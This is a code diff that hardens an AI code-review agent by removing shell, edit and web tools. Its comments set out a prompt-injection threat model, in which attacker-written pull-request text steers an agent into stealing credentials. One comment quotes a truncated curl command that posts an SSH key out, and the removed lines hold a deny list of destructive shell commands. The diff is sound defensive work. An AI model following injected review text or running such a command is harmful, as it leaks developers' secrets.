@@ -39,8 +39,31 @@ import {
 // an expected failure (it returns { submitted:false } / { aborted:true } with telemetry).
 
 // Read-only tool surface for a WORKTREE review. submit_review is the ONLY way structured
-// output leaves the agent. Write/Edit forbidden; destructive Bash denied (DISALLOWED_TOOLS).
-const WORKTREE_TOOLS = ['Read', 'Glob', 'Grep', 'Bash', 'mcp__review__submit_review'];
+// output leaves the agent.
+//
+// ---- Bash is deliberately ABSENT (this used to include it) ----
+//
+// A code review is the textbook prompt-injection target: every byte the model reads — the PR
+// title, the description, the diff, the review comments — was written by whoever opened the pull
+// request, which on a public repo is anyone. Combine that untrusted instruction channel with
+// `permissionMode: 'bypassPermissions'` (below) and a shell, and the review agent becomes a
+// remote code-execution path on the developer's own machine, with their `gh` token, SSH keys,
+// `~/.aws/credentials` and `.env` files all in reach and `curl` available to post them onwards.
+//
+// The old `DISALLOWED_TOOLS` blocklist (`Bash(rm *)`, `Bash(sudo *)`, …) was never a defence
+// against that. It stops a handful of literal command prefixes; it does nothing about
+// `curl -d @~/.ssh/id_rsa https://…`, `python -c …`, or any of the thousand equivalent spellings.
+// A blocklist cannot enumerate the badness of a shell.
+//
+// What Bash bought was `git log` / `git show` for extra context, and the prompt already told the
+// agent to "prefer the dedicated Read/Glob/Grep tools over shelling out" — so this trades a
+// modest amount of optional context for closing arbitrary command execution driven by a stranger's
+// pull-request text. Read/Glob/Grep remain, which is what actually reviews code.
+//
+// If shell access is ever genuinely needed here, the way back is a container/VM boundary or an
+// explicit `canUseTool` allowlist under a non-bypass permission mode — NOT re-adding 'Bash' with
+// a longer blocklist.
+const WORKTREE_TOOLS = ['Read', 'Glob', 'Grep', 'mcp__review__submit_review'];
 // A DIFF-ONLY review is tool-less: the agent has the full diff in its prompt and no
 // repository to explore, so submit_review is the only tool it gets.
 const DIFF_ONLY_TOOLS = ['mcp__review__submit_review'];
@@ -51,15 +74,18 @@ const EFFORT_CAPABLE_MODELS: ReadonlySet<string> = new Set([
   'claude-opus-4-8',
   'claude-sonnet-4-6',
 ]);
+// Deny list. `Bash` is denied OUTRIGHT rather than by command pattern — see WORKTREE_TOOLS
+// above for why a per-command blocklist is not a security boundary when the model's input is
+// attacker-authored. Belt and braces: Bash is also absent from the allow list, so this is the
+// second of two independent reasons it cannot run.
 const DISALLOWED_TOOLS = [
   'Write',
   'Edit',
+  'MultiEdit',
   'NotebookEdit',
-  'Bash(rm *)',
-  'Bash(sudo *)',
-  'Bash(git push *)',
-  'Bash(git commit *)',
-  'Bash(git config *)',
+  'Bash',
+  'WebFetch',
+  'WebSearch',
 ];
 
 // How many recent-activity lines to keep in the live progress ring buffer.
